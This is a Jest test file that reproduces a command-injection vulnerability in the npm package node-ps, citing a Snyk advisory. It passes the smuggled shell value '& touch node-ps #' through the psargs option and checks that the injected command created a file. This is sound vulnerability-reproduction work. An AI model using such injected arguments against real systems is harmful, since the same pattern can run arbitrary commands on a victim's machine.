//https://snyk.io/vuln/SNYK-JS-NODEPS-1048335
test("Command Injection in node-ps", (done) => {
  expect.assertions(2);
  const a = require("node-ps");
  const fs = require("fs");
  const path = "./node-ps";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.lookup({ psargs: ["& touch node-ps #"] }, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
